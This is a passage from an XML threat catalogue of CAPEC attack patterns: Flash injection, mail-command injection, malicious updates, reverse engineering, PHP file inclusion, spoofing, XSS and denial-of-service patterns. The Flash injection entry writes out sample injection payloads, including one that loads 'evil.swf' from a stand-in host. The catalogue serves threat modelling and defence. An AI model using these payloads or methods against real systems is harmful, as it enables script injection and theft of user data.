  <description>An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.The attacker first takes an inventory of the entry points of the application.Spider the website for all available URLs that reference a Flash application.List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.The application has embedded Flash movies.The application does not have embedded Flash movies.Determine the application’s susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.Test the page using direct load asfunction, getURL,javascript:gotRoot(&quot;&quot;)///d.jpgTest the page using controlled evil page/host, http://example.com/evil.swfTest the page using Flash HTML injection, &quot;'&gt;&lt;img src='asfunction:getURL,javascript:gotRoot(&quot;&quot;)//.jpg' &gt;Test the page using DOM injection, (gotRoot(''))Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase The injection can allow the attacker to get sensitive information, escalate privilege, execute commands and cross-site scripting using Flash etc.</description>
</threat>
<threat label="CAPEC-183" name="IMAP/SMTP Command Injection" type="Standard" reference="CAPEC">
  <description>An attacker exploits weaknessness in input validation on IMAP/SMTP servers to execute commands on the server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.</description>
</threat>
<threat label="CAPEC-184" name="Software Integrity Attacks" type="Meta" reference="CAPEC">
  <description>An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.</description>
</threat>
<threat label="CAPEC-185" name="Malicious Software Download" type="Meta" reference="CAPEC">
  <description>An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.</description>
</threat>
<threat label="CAPEC-186" name="Malicious Software Update" type="Standard" reference="CAPEC">
  <description>An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an attacker controlled source. Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an attacker to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity. As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source.Virtually all software requires frequent updates or patches, giving the attacker immense latitude when structuring the attack, as well as many targets of opportunity. Attacks involving malicious software updates can be targeted or untargeted in reference to a population of users, and can also involve manual and automatic means of payload installation. Untargeted attacks rely upon a mass delivery system such as spamming, phishing, or trojans/botnets to distribute emails or other messages to vast populations of users.Targeted attacks aim at a particular demographic or user population. Manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user on clicking a single url. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in his or her arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.Corporate Facebook or Myspace pages make it easy to target users of a specific company or affiliation without relying on email address harvesting or spamming. One phishing-assisted variation on this attack involves hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update. This type of attack has also been conducted using an Instant Messaging virus payload, which harvests the names from a users contact list and sends instant messages to those users to download and apply the update. While both methods involve a high degree of automated mechanisms to support the attack, the primary vector for achieving the installation of the update remains a manual user-directed process, although clicking a link within an IM client or web application may initiate the update.Manual attacks of this nature are common and frequently supported by social networking sites, such as Myspace or Facebook, and have proven to be immensely successful. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters.Automated update mechanisms typically come in two kinds, each requiring different mechanics for exploitation. 'Pull' mechanisms retrieve periodic updates from a server, a process in which the client software or local server installation retrieves the update from a remote network source. While 'Pull' mechanisms are highly automated there is still some user directed activity involved in the update process. 'Push' mechanisms involve a remote server sending an update to a client, which is typically processed when it is received. A characteristic of 'Push' updates is that they typically involve the least user interaction within the update process, thus narrowing the scope of the attack to automated mechanisms. Automated update attacks typically exploit a lack of technical mechanisms to validate the integrity of code before it is downloaded.</description>
</threat>
<threat label="CAPEC-187" name="Malicious Automated Software Update" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in a server or client's process of delivering and verifying the integrity of code supplied by an update-providing server or mechanism to cause code of the attacker's choosing to be downloaded and installed as a software update. Attacks against automated update mechanisms involve attack vectors which are specific to the type of update mechanism, but typically involve two different attack strategies: redirection or spoofing. Redirection-based attacks exploit two layers of weaknesses in server or client software to undermine the integrity of the target code-base.The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update.One predominate type of redirection attack requires DNS spoofing or hijacking of a domain name corresponding to an update server. The target software initiates an update request and the DNS request resolves the domain name of the update server to the IP address of the attacker, at which point the software accepts updates either transmitted by or pulled from the attacker's server. Attacks against DNS mechanisms comprise an initial phase of a chain of attacks that facilitate automated update hijacking attack, and such attacks have a precedent in targeted activities that have been as complex as DNS/BIND attacks of corporate infrastructures, to untargeted attacks aimed at compromising home broadband routers, as well as attacks involving the compromise of wireless access points, as well as 'evil twin' attacks coupled with DNS redirection. Due to the plethora of options open to the attacker in forcing name resolution to arbitrary servers the Automated Update Hijacking attack strategies are the tip of the spear for many multi-stage attack chains.The second weakness that is exploited by the attacker is the lack of integrity checking by the software in validating the update. Software which relies only upon domain name resolution to establish the identity of update code is particularly vulnerable, because this signals an absence of other security countermeasures that could be applied to invalidate the attacker's payload on basis of code identity, hashing, signing, encryption, and other integrity checking mechanisms. Redirection-based attack patterns work equally well against client-side software as well as local servers or daemons that provide software update functionality. One precedent of redirection-based attacks involves the active exploitation of Firefox extensions, such as the Google Toolbar, Yahoo Toolbar, Facebook Toolbar, and others.The second strategy employed in Automated Hijacking Attacks are spoofing strategies, including content or identity spoofing, as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attacker's server. Such attacks have numerous precedents, one in particular being eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attacker's code without integrity checking.</description>
</threat>
<threat label="CAPEC-188" name="Reverse Engineering" type="Meta" reference="CAPEC">
  <description>An attacker discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or &quot;back engineer&quot; some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices or components, or to software, although the methodology and techniques involved in each type of analysis differ widely.</description>
</threat>
<threat label="CAPEC-189" name="Software Reverse Engineering" type="Meta" reference="CAPEC">
  <description>An attacker discovers the structure, function, and composition of a type of computer software by using a variety of analysis techniques to effectively determine how the software functions and operates, or if vulnerabilities or security weakness are present within the implementation. Reverse engineering methods, as applied to software, can utilize a wide number approaches and techniques.Methodologies for software reverse engineering fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.</description>
</threat>
<threat label="CAPEC-19" name="Embedding Scripts within Scripts" type="Standard" reference="CAPEC">
  <description>An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The attacker leverages this capability to execute scripts to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The attacker must have the ability to inject script into script that is likely to be executed. If this is done, then the attacker can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts.With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host.Of course, these attacks are not solely limited to the server side, client side scripts like Ajax and client side Javascript can contain malicious scripts as well. In general all that is required is for there to be sufficient privileges to execute a script, but not protected against writing.Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.Use a spidering tool to follow and record all non static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.Use a proxy tool to record all links visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Inputs are used in a script element (script tag, DOM, etc.) and not in another type of element.Using URL rewriting, parameters may be part of the URL path or the URL fragment.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.Use a proxy tool to record results of the created requests.User-controllable input is output back to the browserUser-controllable input is embedded as part of script elementsOutput to the browser is not encoded to remove executable scripting syntaxServer-side components execute script elements containing user-controllable inputAs the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Enables attacker to execute scripts on remote host</description>
</threat>
<threat label="CAPEC-190" name="Reverse Engineer an Executable to Expose Assumed Hidden Functionality or Content" type="Standard" reference="CAPEC">
  <description>An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable.Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, interprocess communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.White box analysis techniques include file or binary analysis, debugging, disassembly, and decompilation, and generally fall into categories referred to as 'static' and 'dynamic' analysis. Static analysis encompasses methods which analyze the binary, or extract its source code or object code without executing the program. Dynamic analysis involves analyzing the program during execution.Some forms of file analysis tools allow the executable itself to be analyzed, the most basic of which can analyze features of the binary, such as the strings contained within the file. More sophisticated forms of static analysis analyze the binary file and extract assembly code, and possibly source code representations, from analyzing the structure of the file itself. Dynamic analysis tools execute the binary file and monitor its in memory footprint, revealing its execution flow, memory usage, register values, and machine instructions. This type of analysis is most effective for analyzing the execution of binary files whose content has been obfuscated or encrypted in its native executable form.Debuggers allow the program's execution to be monitored, and depending upon the debugger's sophistication may show relevant source code for each step in execution, or may display and allow interactions with memory, variables, or values generated by the program during run-time operations. Disassemblers operate in reverse of assemblers, allowing assembly code to be extracted from a program as it executes machine code instructions. Disassemblers allow low-level interactions with the program as it executes, such as manipulating the program's run time operations. Decompilers can be utilized to analyze a binary file and extract source code from the compiled executable. Collectively, the tools and methods described are those commonly applied to a binary executable file and provide means for reverse engineering the file by revealing the hidden functions of its operation or composition.</description>
</threat>
<threat label="CAPEC-191" name="Read Sensitive Strings Within an Executable" type="Detailed" reference="CAPEC">
  <description>An attacker engages in activities to discover any sensitive strings are present within the compiled code of an executable, such as literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password.When analyzing an executable the attacker may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions.More sophisticated methods of searching for sensitve strings within a file involve dissassembly or decompiling of the file. One could, for example, utilize dissassembly methods on a ISAPI executable or dll to discover a hard-coded password within the code as it executes. This type of analysis usually involves four stages in which first a debugger is attached to the running process, anti-debugging countermeasures are circumvented or bypassed, the program is analyzed step-by-step, and breakpoints are established so that discrete functions and data structures can be analyzed.Debugging tools such as SoftICE, Ollydbg, or vendor supplied debugging tools are often used. Dissassembly tools such as IDA pro, or similar tools, can also be employed. A third strategy for accessing sensitive strings within a binary involves the decompilation of the file itself into source code that reveals the strings. An example of this type of analysis involves extracting source code from a java JAR file and then using functionality within a java IDE to search the source code for sensitive, hard-coded information. In performing this analysis native java tools, such as &quot;jar&quot; are used to extract the compiled class files. Next, a java decompiler such as &quot;DJ&quot; is used to extract java source code from the compiled classes, revealing source code. Finally, the source code is audited to reveal sensitive information, a step that is usually assisted by source code analysis programs.</description>
</threat>
<threat label="CAPEC-192" name="Protocol Reverse Engineering" type="Standard" reference="CAPEC">
  <description>An attacker engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis inherently involves the analysis of a networking protocol, it does not require the presence of an actual or physical network. Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation.Depending upon the methods used, protocol reverse engineering can involve similar methods as those employed when reverse engineering an executable, or the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol reverse engineering is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications.There are several challenges inherent to protocol reverse engineering depending upon the nature of the protocol being analyzed. There may also be other types of factors which complicate the process such as encryption or ad hoc obfuscation of the protocol. In general there are two kinds of networking protocols, each associated with its own challenges and analysis approaches or methodologies. Some protocols are human-readable, which is to say they are text-based protocols. Examples of these types of protocols include HTTP, SMTP, and SOAP. Additionally, application-layer protocols can be embedded or encapsulated within human-readable protocols in the data portion of the packet. Typically, human-readable protocol implementations are susceptible to automatic decoding by the appropriate tools, such as Wireshark/ethereal, tcpdump, or similar protocol sniffers or analyzers.The presence of well-known protocol specifications in addition to easily identified protocol delimiters, such as Carriage Return or Line Feed characters (CRLF) result in text-based protocols susceptibility to direct scrutiny through manual processes. Protocol reverse engineering against protocol implementation such as HTTP is often performed to identify idiosyncratic implementations of a protocol by a server or client. In the case of application-layer protocols which are embedded within text-based protocols, analysis techniques typically benefit from the well-known nature of the encapsulating protocols and can focus on discovering the semantic characteristics of the proprietary protocol or API, since the syntax and protocol delimiters of the underlying protocols can be readily identified.When performing protocol analysis of machine-readable (non text-based) protocols difficulties emerge as the protocol itself was designed to be read by computing process. Such protocols are typically composed entirely in binary with no apparent syntax, grammar, or structural boundaries. Examples of these types of protocols are IP, UDP, and TCP. Binary protocols with published specifications can be automatically decoded by protocol analyzers, but in the case of proprietary, closed-specification, binary protocols there are no immediate indicators of packet syntax such as packet boundaries, delimiters, or structure, or the presence or absence of encryption or obfuscation. In these cases there is no one technology that can extract or reveal the structure of the packet on the wire, so it is necessary to use trial and error approaches while observing application behavior based on systematic mutations introduced at the packet-level. Tools such as Protocol Debug (PDB) or other packet injection suites are often employed. In cases where the binary executable is available, protocol analysis can be augmented with static and dynamic analysis techniques.</description>
</threat>
<threat label="CAPEC-193" name="PHP Remote File Inclusion" type="Standard" reference="CAPEC">
  <description>In this pattern the attacker is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized &quot;include&quot; or “require” call, which the user can then control to point to any web-accessible file. This allows attackers to hijack the targeted application and force it to execute their own instructions.Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.URL parameters are used by the applicationUsing URL rewriting, parameters may be part of the URL path.No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads which include a reference to the remote PHP script. He records all the responses from the server that include the output of the execution of remote PHP script.Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the attacker’s controlled remote PHP script.Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.The output of the remote PHP script is included in the response web page.Nothing is returned to the web page. The payload script might have been executed in a different context which wouldn’t be included in the response web pageThe application returns an error associated with the inclusion of remote file.The application server doesn’t download the remote PHP script.As the attacker succeeds in exploiting the vulnerability, he is able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the attacker might include shell code in his script and execute commands on the server under the same privileges as the PHP runtime is running with.Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.Application server may be used to steal information such as code, create custom queries to the databases, etc. Since the attacker’s script runs within the same context as the application it is injected in, it has virtually the same capabilities.</description>
</threat>
<threat label="CAPEC-194" name="Fake the Source of Data" type="Standard" reference="CAPEC">
  <description>The attacker provides data under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or it might be an attempt by the attacker to assume the rights granted to another identity. One of the simplest forms of this attack would be the creation of an email message with a modified &quot;From&quot; field in order to appear that the message was sent from someone other than the actual sender. Results of the attack vary depending on the details of the attack, but common results include privilege excalation, obfuscation of other attacks, and data corruption/manipulation. This attack represents a subset of the Identity Spoofing and Content Spoofing attacks. Identity spoofing is a broader pattern, including situations where no data is exchange (for example, logging into a computer under an assumed name). Content Spoofing is likewise very similar, but would include cases where there is not an active attempt to fake a data source (for example, appending content onto an existing email message without changing the From field would be considered Content Spoofing, but not Faking the Source of Data since the data source was not faked).</description>
</threat>
<threat label="CAPEC-195" name="Principal Spoofing" type="Standard" reference="CAPEC">
  <description>An attacker crafts a message that masquerades as a message from a person other than the actual message sender. This attack is a subset of the Identity Spoofing attack in that Principal Spoofing refers to pretending to be some other person in an interaction while Identity Spoofing refers to assuming the identity of any entity. As such, impersonating a server would be Identity Spoofing but not Principal Spoofing. The possible outcomes of Principal Spoofing mirror those of Identity Spoofing. (E.g. escalation of privilege and false attribution of data or activities.) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoofing attack. However, because Principal Spoofing is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).</description>
</threat>
<threat label="CAPEC-196" name="Session Credential Falsification through Forging" type="Standard" reference="CAPEC">
  <description>An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.The attacker finds that the targeted application use session credentials to identify legitimate users.An attacker makes many anonymous connections and records the session IDs.An attacker makes authorized connections and records the session tokens or credentials.Valid session informationNo valid session informationAttackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.The attacker manipulates the HTTP request message and adds his forged session IDs in to the requests or cookies.Find that application uses session credentials.Find that application does not use session credentials.The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.The attacker loads the predefined or predicted session ID into his browser and browses to protected data or functionality.The attacker loads the predefined or predicted session ID into his software and utilizes functionality with the rights of the victim.The payload activation impact is that a session identifier of the attacker's choice is considered valid and trust decisions by the application will be based on such a forged identifier.</description>
</threat>
<threat label="CAPEC-197" name="XEE (XML Entity Expansion)" type="Standard" reference="CAPEC">
  <description>An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.Use an automated tool to record all instances of URLs to process XML requests.Use a browser to manually explore the website and analyze how the application processes XML requests.The URL processes XML content.The application does not seem to accept XML content.The attacker crafts malicious XML message to force recursive entity expansion (or other repeated processing) that completely uses up available server resource.Send the malicious crafted XML message containing recursive entity uses to the target URL.Denial of Service</description>
</threat>
<threat label="CAPEC-198" name="Cross-Site Scripting in Error Pages" type="Standard" reference="CAPEC">
  <description>An attacker distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.</description>
</threat>
<threat label="CAPEC-199" name="Cross-Site Scripting Using Alternate Syntax" type="Standard" reference="CAPEC">
  <description>The attacker uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the &quot;script&quot; tag using the alternate forms of &quot;Script&quot; or &quot;ScRiPt&quot; may bypass filters where &quot;script&quot; is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.URL parameters are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. The payloads are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and tries many variations of characters injection that would enable the XSS payload. He records all the responses from the server that include unmodified versions of his script.Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax &amp; encoding.Use a proxy tool to record results of manual input of XSS probes in known URLs.The output of pages includes some form of a URL parameter. E.g., ?error=&quot;File not Found&quot; becomes &quot;File not Found&quot; in the title of the web pageUser-controllable input is output back to the browserNothing is returned to the web page. The payload may be a stored to be served later. The unique identifier from the probe helps to trace the flow of the possible XSS.As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Client web browser may be used to steal session data, passwords, cookies, and other tokens.</description>
</threat>
<threat label="CAPEC-2" name="Inducing Account Lockout" type="Standard" reference="CAPEC">
  <description>An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.Investigate the security features present in the system that may trigger an account lockoutAnalyze system documentation to find list of events that could potentially cause account lockoutObtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedlyDetermine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.System provides error message stating that account being attacked is locked out.After a certain number of login attempts with a given user ID, the amount of time it takes for system to respond to further login attempts changes noticably.System has no automatic signup mechanism, and system provides no indication as to whether the attacker is entering incorrect credentials or the account is locked out during the login process.Generate a list of valid user accounts to lock outObtain list of authorized users using another attack pattern, such as SQL Injection.Attempt to create accounts if possible; system should indicate if a user ID is already taken.Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.System indicates which user IDs are valid and which are not to unauthenticated users.Perform lockout procedure for all accounts that the attacker wants to lock out.For each user ID to be locked out, perform the lockout procedure discovered in the first step.Success outcome in first stepFailure outcome in first step</description>
</threat>
<threat label="CAPEC-20" name="Encryption Brute Forcing" type="Standard" reference="CAPEC">
  <description>An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.Determine the ciphertext and the encryption algorithm.Perform an exhaustive brute force search of the keyspace, producing candidate plaintexts and observing if they make sense.None. This attack happens offline.</description>
</threat>
<threat label="CAPEC-200" name="Removal of filters: Input filters, output filters, data masking" type="Standard" reference="CAPEC">
  <description>An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content. For example, if an application accepts scripting languages as input, an input filter could constrain the commands received and block those that the application's administrator deems to be overly powerful. An output filter screens responses from an application or person in order to prevent disclosure of sensitive information. For example, an application's output filter might block output that is sourced to sensitive folders or which contains certain keywords. A data mask is similar to an output filter, but usually applies to structured data, such as found in databases. Data masks elide or replace portions of the information returned from a query in order to protect against the disclosure of sensitive information.If an input filter is removed the attacker will be able to send content to the target and have the target utilize it without it being sanitized. If the content sent by the attacker is executable, the attacker may be able to execute arbitrary commands on the target. If an output filter or data masking mechanism is disabled, the target may send out sensitive information that would otherwise be elided by the filters. If the data mask is disabled, sensitive information stored in a database would be returned unaltered. This could result in the disclosure of sensitive information, such as social security numbers of payment records.This attack is usually executed as part of a larger attack series. The attacker would disable filters and would then mount additional attacks to either insert commands or data or query the target application in ways that would otherwise be prevented by the filters.</description>
</threat>
<threat label="CAPEC-201" name="External Entity Attack" type="Standard" reference="CAPEC">
